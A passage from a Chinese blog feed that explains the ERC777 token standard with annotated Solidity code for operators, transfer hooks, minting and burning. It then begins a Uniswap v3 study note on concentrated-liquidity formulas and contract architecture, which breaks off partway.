_implementer);<br>&#125;<br></code></pre></td></tr></table></figure><p>getInterfaceImplementer 查询地址是否实现了接口以及通过哪个合约实现的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/// @notice 查询地址是否实现了接口以及通过哪个合约实现的。<br>/// @param _addr 查询地址（如果&#x27;_addr&#x27;是零地址，则假定为&#x27;msg.sender&#x27;）。<br>/// @param _interfaceHash 查询接口，它是接口名称字符串的 keccak256 哈希值<br>/// 例如: &#x27;web3.utils.keccak256(&quot;ERC777TokensRecipient&quot;)&#x27; 表示 &#x27;ERC777TokensRecipient&#x27; 接口.<br>/// @return 返回实现者的地址，没有实现返回 ‘0’<br>function getInterfaceImplementer(address _addr, bytes32 _interfaceHash) external view returns (address) &#123;<br>    address addr = _addr == address(0) ? msg.sender : _addr;<br>    if (isERC165Interface(_interfaceHash)) &#123;<br>        bytes4 erc165InterfaceHash = bytes4(_interfaceHash);<br>        return implementsERC165Interface(addr, erc165InterfaceHash) ? addr : address(0);<br>    &#125;<br>    return interfaces[addr][_interfaceHash];<br>&#125;<br></code></pre></td></tr></table></figure><p>ERC777 使用 send 转账时会分别在持有者和接收者地址上使用 ERC1820 的getInterfaceImplementer 函数进行查询，查看是否有对应的实现合约，ERC777 标准规范里预定了接口及函数名称，如果有实现则进行相应的调用。</p><h2 id="基本变量"><a href="#基本变量" class="headerlink" title="基本变量"></a>基本变量</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// ERC1820 注册表合约地址<br>IERC1820Registry private _erc1820 = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);<br><br>mapping(address =&gt; uint256) private _balances;<br><br>uint256 private _totalSupply;<br><br>string private _name;<br>string private _symbol;<br><br><br>// 发送者接口hash 硬编码 keccak256(&quot;ERC777TokensSender&quot;) 为了减少 gas， 用户查询是否实现了对应的接口。<br>bytes32 constant private TOKENS_SENDER_INTERFACE_HASH =<br>    0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895;<br><br>// keccak256(&quot;ERC777TokensRecipient&quot;)<br>bytes32 constant private TOKENS_RECIPIENT_INTERFACE_HASH =<br>    0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b;<br><br>// 保存默认操作者列表，只能在代币创建时定义<br>address[] private _defaultOperatorsArray;<br><br>// 为了索引默认操作者状态 使用的mapping<br>mapping(address =&gt; bool) private _defaultOperators;<br><br>// 保存授权的操作者<br>mapping(address =&gt; mapping(address =&gt; bool)) private _operators;<br>// 保存取消授权的默认操作者<br>mapping(address =&gt; mapping(address =&gt; bool)) private _revokedDefaultOperators;<br><br>// 为了兼容 ERC20 （授权信息）<br>mapping (address =&gt; mapping (address =&gt; uint256)) private _allowances;<br></code></pre></td></tr></table></figure><h2 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/**<br> * @dev `defaultOperators` 可以为空.<br> */<br>constructor(<br>    string memory name,<br>    string memory symbol,<br>    address[] memory defaultOperators<br>) public &#123;<br>    _name = name;<br>    _symbol = symbol;<br><br>    // 初始化默认操作者列表<br>    _defaultOperatorsArray = defaultOperators;<br>    for (uint256 i = 0; i &lt; _defaultOperatorsArray.length; i++) &#123;<br>        _defaultOperators[_defaultOperatorsArray[i]] = true;<br>    &#125;<br><br>    // 注册接口<br>    _erc1820.setInterfaceImplementer(address(this), keccak256(&quot;ERC777Token&quot;), address(this));<br>    _erc1820.setInterfaceImplementer(address(this), keccak256(&quot;ERC20Token&quot;), address(this));<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="查询函数"><a href="#查询函数" class="headerlink" title="查询函数"></a>查询函数</h2><p>name()，symbol()，totalSupply()，balanceOf(address) 和含义和在ERC20 中完全一样。</p><p>granularity() 用来定义代币最小的划分粒度（&gt;=1）， 要求必须在创建时设定，之后不可以更改，不管是在铸币、发送还是销毁操作的代币数量，必需是粒度的整数倍。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function name() public view returns (string memory) &#123;<br>    return _name;<br>&#125;<br><br>function symbol() public view returns (string memory) &#123;<br>    return _symbol;<br>&#125;<br><br>// 定义小数位数，为了兼容 ERC20<br>function decimals() public pure returns (uint8) &#123;<br>    return 18;<br>&#125;<br><br>// 默认粒度为1，粒度表示代币最小的分隔单位 <br>function granularity() public view returns (uint256) &#123;<br>    return 1;<br>&#125;<br><br>function totalSupply() public view returns (uint256) &#123;<br>    return _totalSupply;<br>&#125;<br><br>function balanceOf(address tokenHolder) public view returns (uint256) &#123;<br>    return _balances[tokenHolder];<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="操作员"><a href="#操作员" class="headerlink" title="操作员"></a>操作员</h2><p>ERC777 定义了一个新的操作员角色，操作员被作为移动代币的地址。 每个地址直观地移动自己的代币，将持有人和操作员的概念分开可以提供更大的灵活性。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 是否是操作员<br>function isOperatorFor(<br>    address operator,<br>    address tokenHolder<br>) public view returns (bool) &#123;<br>    return operator == tokenHolder ||<br>        (_defaultOperators[operator] &amp;&amp; !_revokedDefaultOperators[tokenHolder][operator]) ||<br>        _operators[tokenHolder][operator];<br>&#125;<br><br>// 授权操作员<br>function authorizeOperator(address operator) external &#123;<br>    require(msg.sender != operator, &quot;ERC777: authorizing self as operator&quot;);<br><br>    if (_defaultOperators[operator]) &#123;<br>        delete _revokedDefaultOperators[msg.sender][operator];<br>    &#125; else &#123;<br>        _operators[msg.sender][operator] = true;<br>    &#125;<br><br>    emit AuthorizedOperator(operator, msg.sender);<br>&#125;<br><br>// 撤销操作员<br>function revokeOperator(address operator) external &#123;<br>    require(operator != msg.sender, &quot;ERC777: revoking self as operator&quot;);<br><br>    if (_defaultOperators[operator]) &#123;<br>        _revokedDefaultOperators[msg.sender][operator] = true;<br>    &#125; else &#123;<br>        delete _operators[msg.sender][operator];<br>    &#125;<br><br>    emit RevokedOperator(operator, msg.sender);<br>&#125;<br><br>// 默认操作者<br>function defaultOperators() public view returns (address[] memory) &#123;<br>    return _defaultOperatorsArray;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="转账逻辑"><a href="#转账逻辑" class="headerlink" title="转账逻辑"></a>转账逻辑</h2><p>如果持有者希望在转账时收到代币转移通知，就需要在ERC1820合约上注册及实现 <code>ERC777TokensSender</code> 接口</p><p>如果接收者希望在转账时收到代币转移通知，就需要在ERC1820合约上注册及实现 <code>ERC777TokensRecipient</code> 接口</p><p>注意: 对于所有的 ERC777 合约， 一个持有者地址只能注册一个ERC777TokensSender接口实现。因此 ERC777TokensSender 实现会被多个ERC777合约调用，在ERC777TokensSender接口的实现合约里， msg.sender 是ERC777合约地址，而不是操作者。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><code class="hljs solidity">   // ERC777 定义的转账函数， 同时触发 ERC20的 `Transfer` 事件<br>   function send(address recipient, uint256 amount, bytes calldata data) external &#123;<br>       _send(msg.sender, msg.sender, recipient, amount, data, &quot;&quot;, true);<br>   &#125;<br>   <br>   // 转移代币，需要有操作者权限，触发 `Sent` 和 `Transfer` 事件<br>   function operatorSend(<br>       address sender,<br>       address recipient,<br>       uint256 amount,<br>       bytes calldata data,<br>       bytes calldata operatorData<br>   )<br>   external<br>   &#123;<br>       require(isOperatorFor(msg.sender, sender), &quot;ERC777: caller is not an operator for holder&quot;);<br>       _send(msg.sender, sender, recipient, amount, data, operatorData, true);<br>   &#125;<br>   <br>   // 为兼容 ERC20，同时触发 `Sent` 事件<br>   function transfer(address recipient, uint256 amount) external returns (bool) &#123;<br>       require(recipient != address(0), &quot;ERC777: transfer to the zero address&quot;);<br><br>       address from = msg.sender;<br><br>       _callTokensToSend(from, from, recipient, amount, &quot;&quot;, &quot;&quot;);<br><br>       _move(from, from, recipient, amount, &quot;&quot;, &quot;&quot;);<br><br>       //最后一个参数表示不要求接收者实现钩子函数 `tokensReceived`<br>       _callTokensReceived(from, from, recipient, amount, &quot;&quot;, &quot;&quot;, false);<br><br>       return true;<br>   &#125;<br>   <br>   // 转移 token<br>   // 最后一个参数 requireReceptionAck 表示是否必须实现 ERC777TokensRecipient<br>   function _send(<br>       address operator,<br>       address from,<br>       address to,<br>       uint256 amount,<br>       bytes memory userData,<br>       bytes memory operatorData,<br>       bool requireReceptionAck<br>   )<br>       private<br>   &#123;<br>       require(from != address(0), &quot;ERC777: send from the zero address&quot;);<br>       require(to != address(0), &quot;ERC777: send to the zero address&quot;);<br><br>       // 在修改余额状态之前调用tokensToSend <br>       _callTokensToSend(operator, from, to, amount, userData, operatorData);<br><br>       // 修改余额状态<br>       _move(operator, from, to, amount, userData, operatorData);<br><br>       // 在修改余额状态之后调用tokensReceived <br>       _callTokensReceived(operator, from, to, amount, userData, operatorData, requireReceptionAck);<br>   &#125;<br><br>// 转移所有权<br>   function _move(<br>       address operator,<br>       address from,<br>       address to,<br>       uint256 amount,<br>       bytes memory userData,<br>       bytes memory operatorData<br>   )<br>       private<br>   &#123;<br>       _balances[from] = _balances[from].sub(amount);<br>       _balances[to] = _balances[to].add(amount);<br><br>       emit Sent(operator, from, to, amount, userData, operatorData);<br>       emit Transfer(from, to, amount);<br>   &#125;<br>   <br>   // 尝试调用持有者的 tokensToSend() 函数<br>   // 如果持有者有通过 ERC1820 注册 ERC777TokensSender 实现接口， 代币合约必须调用其 tokensToSend 钩子函数<br>   function _callTokensToSend(<br>       address operator,<br>       address from,<br>       address to,<br>       uint256 amount,<br>       bytes memory userData,<br>       bytes memory operatorData<br>   )<br>       private<br>   &#123;<br>       address implementer = _erc1820.getInterfaceImplementer(from, TOKENS_SENDER_INTERFACE_HASH);<br>       if (implementer != address(0)) &#123;<br>           IERC777Sender(implementer).tokensToSend(operator, from, to, amount, userData, operatorData);<br>       &#125;<br>   &#125;<br><br>  // 尝试调用接收者的 tokensReceived()<br>  // 如果接收者有通过 ERC1820 注册 ERC777TokensRecipient 实现接口， 代币合约必须调用其 tokensReceived 钩子函数。<br>  function _callTokensReceived(<br>       address operator,<br>       address from,<br>       address to,<br>       uint256 amount,<br>       bytes memory userData,<br>       bytes memory operatorData,<br>       bool requireReceptionAck<br>   )<br>       private<br>   &#123;<br>       address implementer = _erc1820.getInterfaceImplementer(to, TOKENS_RECIPIENT_INTERFACE_HASH);<br>       if (implementer != address(0)) &#123;<br>           IERC777Recipient(implementer).tokensReceived(operator, from, to, amount, userData, operatorData);<br>       &#125; else if (requireReceptionAck) &#123;<br>           // 如果接收者是一个合约地址， 则必须要注册及实现 ERC777TokensRecipient 接口（这样可以防止代币被锁死），如果没有实现，ERC777代币合约必须revert 回退交易状态<br>           require(!to.isContract(), &quot;ERC777: token recipient contract has no implementer for ERC777TokensRecipient&quot;);<br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure><p>以及一个 transferFrom 函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 注意， 操作员没有权限调用（除非经过approve）<br>// 触发 `Sent` and `Transfer`事件<br><br> function transferFrom(address holder, address recipient, uint256 amount) external returns (bool) &#123;<br>     require(recipient != address(0), &quot;ERC777: transfer to the zero address&quot;);<br>     require(holder != address(0), &quot;ERC777: transfer from the zero address&quot;);<br><br>     address spender = msg.sender;<br><br>     _callTokensToSend(spender, holder, recipient, amount, &quot;&quot;, &quot;&quot;);<br><br>     _move(spender, holder, recipient, amount, &quot;&quot;, &quot;&quot;);<br>     _approve(holder, spender, _allowances[holder][spender].sub(amount));<br><br>     _callTokensReceived(spender, holder, recipient, amount, &quot;&quot;, &quot;&quot;, false);<br><br>     return true;<br> &#125;<br></code></pre></td></tr></table></figure><h2 id="铸币操作"><a href="#铸币操作" class="headerlink" title="铸币操作"></a>铸币操作</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 铸币函数（即常说的挖矿）<br>function _mint(<br>    address operator,<br>    address account,<br>    uint256 amount,<br>    bytes memory userData,<br>    bytes memory operatorData<br>)<br>internal<br>&#123;<br>    require(account != address(0), &quot;ERC777: mint to the zero address&quot;);<br><br>    // Update state variables<br>    // 发行量需要加上铸币量<br>    _totalSupply = _totalSupply.add(amount);<br>    // 接收者余额加上铸币量<br>    _balances[account] = _balances[account].add(amount);<br><br>    _callTokensReceived(operator, address(0), account, amount, userData, operatorData, true);<br><br>    // 触发 Minted 事件<br>    emit Minted(operator, account, amount, userData, operatorData);<br>    emit Transfer(address(0), account, amount);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="代币销毁"><a href="#代币销毁" class="headerlink" title="代币销毁"></a>代币销毁</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 为了兼容 ERC20， 触发 `Transfer` 事件<br>function burn(uint256 amount, bytes calldata data) external &#123;<br>    _burn(msg.sender, msg.sender, amount, data, &quot;&quot;);<br>&#125;<br><br>// 销毁<br>function operatorBurn(address account, uint256 amount, bytes calldata data, bytes calldata operatorData) external &#123;<br>    require(isOperatorFor(msg.sender, account), &quot;ERC777: caller is not an operator for holder&quot;);<br>    _burn(msg.sender, account, amount, data, operatorData);<br>&#125;<br><br>// 销毁代币实现<br>function _burn(<br>    address operator,<br>    address from,<br>    uint256 amount,<br>    bytes memory data,<br>    bytes memory operatorData<br>)<br>    private<br>&#123;<br>    require(from != address(0), &quot;ERC777: burn from the zero address&quot;);<br><br>    _callTokensToSend(operator, from, address(0), amount, data, operatorData);<br><br>    // Update state variables<br>    // 总供应量必须减少代币销毁量<br>    _totalSupply = _totalSupply.sub(amount);<br>    // 持有者的余额必须减少代币销毁的数量<br>    _balances[from] = _balances[from].sub(amount);<br><br>    // 触发 Burned 事件<br>    emit Burned(operator, from, amount, data, operatorData);<br>    emit Transfer(from, address(0), amount);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="监听示例"><a href="#监听示例" class="headerlink" title="监听示例"></a>监听示例</h2><p>通过<strong>实现 ERC777TokensRecipient接口</strong>来监听代币收款</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.5.0;<br><br>import &quot;@openzeppelin/contracts/token/ERC777/IERC777Recipient.sol&quot;;<br>import &quot;@openzeppelin/contracts/token/ERC777/IERC777.sol&quot;;<br>import &quot;@openzeppelin/contracts/introspection/IERC1820Registry.sol&quot;;<br><br>contract Merit is IERC777Recipient &#123;<br><br>  mapping(address =&gt; uint) public givers;<br>  address _owner;<br>  IERC777 _token;<br><br>  IERC1820Registry private _erc1820 = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);<br><br>  // keccak256(&quot;ERC777TokensRecipient&quot;)<br>  bytes32 constant private TOKENS_RECIPIENT_INTERFACE_HASH =<br>      0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b;<br><br>  constructor(IERC777 token) public &#123;<br>    _erc1820.setInterfaceImplementer(address(this), TOKENS_RECIPIENT_INTERFACE_HASH, address(this));<br>    _owner = msg.sender;<br>    _token = token;<br>  &#125;<br><br>// 收款时被回调<br>  function tokensReceived(<br>      address operator,<br>      address from,<br>      address to,<br>      uint amount,<br>      bytes calldata userData,<br>      bytes calldata operatorData<br>  ) external &#123;<br>    givers[from] += amount;<br>  &#125;<br><br>// 方丈取回功德箱token<br>  function withdraw () external &#123;<br>    require(msg.sender == _owner, &quot;no permision&quot;);<br>    uint balance = _token.balanceOf(address(this));<br>    _token.send(_owner, balance, &quot;&quot;);<br>  &#125;<br><br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>调用 ERC1820 注册表合约的 setInterfaceImplementer函数 注册ERC777TokensRecipient接口实现（接口的实现是自身），这样在收到代币时，会回调 tokensReceived函数，tokensReceived函数通过givers映射来保存每个用户的代币金额。</p><h2 id="安全事件"><a href="#安全事件" class="headerlink" title="安全事件"></a>安全事件</h2><p><a href="https://paper.seebug.org/1182/">Uniswap 的 ERC777 重入风险</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ERC777&quot;&gt;&lt;a href=&quot;#ERC777&quot; class=&quot;headerlink&quot; title=&quot;ERC777&quot;&gt;&lt;/a&gt;ERC777&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://eips.ethereum.org/EIPS/eip-777&quot;&gt;ERC77</summary>
      
    
    
    
    
    <category term="Etherum" scheme="http://example.com/tags/Etherum/"/>
    
    <category term="EIP" scheme="http://example.com/tags/EIP/"/>
    
  </entry>
  
  <entry>
    <title>Uniswap v3 学习笔记</title>
    <link href="http://example.com/2022/10/04/uniswap-v3-learning/"/>
    <id>http://example.com/2022/10/04/uniswap-v3-learning/</id>
    <published>2022-10-04T12:51:17.000Z</published>
    <updated>2022-10-04T12:57:52.036Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p><a href="https://uniswap.org/whitepaper-v3.pdf">Uniswap v3 白皮书</a></p><h2 id="v2核心公式"><a href="#v2核心公式" class="headerlink" title="v2核心公式"></a>v2核心公式</h2><p><code>x*y=k</code>，即池子中<code>资产X的数量 * 资产Y的数量 = 流动性数量</code>。</p><p><img src="/2022/10/04/uniswap-v3-learning/understanding-01-pricechange.webp" alt="price changing"></p><p>但是资金利用率不高</p><p><img src="/2022/10/04/uniswap-v3-learning/understanding-02-liquidityrate.png" alt="liquidity rate"></p><p>当用户用 X 换取 Y 的时候，价格会从低点涨到高点，红点从 <code>p_lower</code> 移动到 <code>p_upper</code> 的过程中（X 的价格），实际参与交易的流动性仅仅是橙色的矩形区域。</p><p>所以提高利用率的关键是既要移除那些躺在那不干活的流动性（绿色区域），又要保证这个函数模型不变。于是我们将其换成了虚拟的流动性，即 <code>x_virtual</code> 和 <code>y_virtual</code>，而添加流动性时，只需要注入橙色区域的流动性即可。于是公式变成了如下模样：</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-comment">(x + x_virtual)</span>*<span class="hljs-comment">(y + y_virtual)</span>=k<br></code></pre></td></tr></table></figure><p><img src="/2022/10/04/uniswap-v3-learning/understanding-03-realliquidity.png" alt="real liquidity"></p><p>整个图形向左下方平移了，因为价格是直线的斜率，所以平移对于实际交易是没有影响的。<strong>前提是价格没有超出限定的区间</strong>。</p><h2 id="v3核心公式"><a href="#v3核心公式" class="headerlink" title="v3核心公式"></a>v3核心公式</h2><p>将代表流动性的 <code>k</code> 换成 <code>𝐿^2</code> 即 L 的平方</p><p>可以看出 <code>x_virtual</code> 的长度实际是 <code>p_upper</code> 点的 x，而 <code>y_virtual</code> 的长度实际上是 <code>p_lower</code> 点的 y。</p><p>有价格的公式 <code>y = p*x</code> 和 <code>xy=L^2</code> </p><p>可以得出</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs awk">x = L / √p<br>y = L * √p<br><br><span class="hljs-regexp">//</span>也就是<br>x_virtual = L / √p_upper<br>y_virtual = L * √p_lower<br><br><span class="hljs-regexp">//</span>即核心公式<br>(x + L / √p_upper) * (y + L * √p_lower) = L^<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>可以看到，公式中是将 <code>p_upper</code> 和 <code>p_lower</code> 作为已知的变量，所以在 V3 中添加流动性，是需要用户自己设置需要做市的价格区间的。V3 中创建者不同或者价格区间不同（或手续费水平不同，后面展开讨论）都是不同的流动性头寸 <code>position</code>。</p><h2 id="AMM"><a href="#AMM" class="headerlink" title="AMM"></a>AMM</h2><p>AMM，全称Automated Market Makers，翻译过来是自动做市商。其基础模型来源于Vitalik于2017年发表的<a href="https://vitalik.ca/general/2017/06/22/marketmakers.html">博客</a>，讨论了“恒定乘机公式”，即每一个Uniswap Pair 中存有两种资产，并为这两种资产提供流动性。</p><p>swap中的曲线移动</p><p><img src="/2022/10/04/uniswap-v3-learning/rbuQJaMz60f3e528e4f29.png" alt="image20210717105238162.png"></p><p>mint中的曲线移动</p><p><img src="/2022/10/04/uniswap-v3-learning/image-20221004205749992.png" alt="image-20221004205749992"></p><p>burn是mint的逆向</p><h2 id="源码阅读"><a href="#源码阅读" class="headerlink" title="源码阅读"></a>源码阅读</h2><p>Uniswap v3 在代码层面的架构和 v2 基本保持一致，将合约分成了两个仓库：</p><ul><li><a href="https://github.com/Uniswap/v3-core">Uniswap-v3-core</a><ul><li>UniswapV3Factory 是交易池(UniswapV3Pool)统一创建的接口。</li><li>UniswapV3Pool 由 UniswapV3PoolDeployer 统一部署。 实现代币交易，流动性管理，交易手续费的收取，oracle 数据管理。接口的实现粒度比较低，不适合普通用户使用，错误的调用其中的接口可能会造成经济上的损失。 UniswapV3Pool 是核心逻辑，管理了 Tick 和 Position，实现流动性管理以及一个交易池中 swap 功能实现。</li></ul></li><li><a href="https://github.com/Uniswap/v3-periphery">Uniswap-v3-periphery</a><ul><li>NonfungiblePositionManager 负责交易池的创建以及流动性的添加删除，用来增加/移除/修改 Pool 